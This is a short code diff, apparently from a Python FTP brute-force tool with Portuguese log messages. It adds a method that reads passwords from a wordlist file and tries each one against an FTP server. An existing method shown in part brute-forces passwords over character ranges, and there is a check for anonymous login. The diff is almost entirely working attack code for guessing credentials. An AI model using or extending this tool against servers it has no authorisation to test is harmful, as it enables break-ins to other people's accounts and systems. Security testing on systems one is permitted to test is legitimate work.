@@ -22,7 +22,6 @@ class ftp_brute:
         except:
             Debug.AVISO("[+]Anonymous off")
             pass
-
     def ftp_brute_char(hostname,user,minimo,maximo,char,verbose=""):
         min = minimo
         max = maximo
@@ -36,5 +35,10 @@ class ftp_brute:
                         FTP(hostname,user,passw)
                     except ftplib.all_errors:
                         Debug.ERRO("[+]senha errada => %s"%passw)
-
-
+    def ftp_brute_file(hostname,user,filebr,verbose=""):
+        with open(filebr,"r") as fl:
+            for passw in fl:
+                try:
+                    FTP(hostname, user, passw)
+                except ftplib.all_errors:
+                    Debug.ERRO("[+]senha errada => %s" % passw)
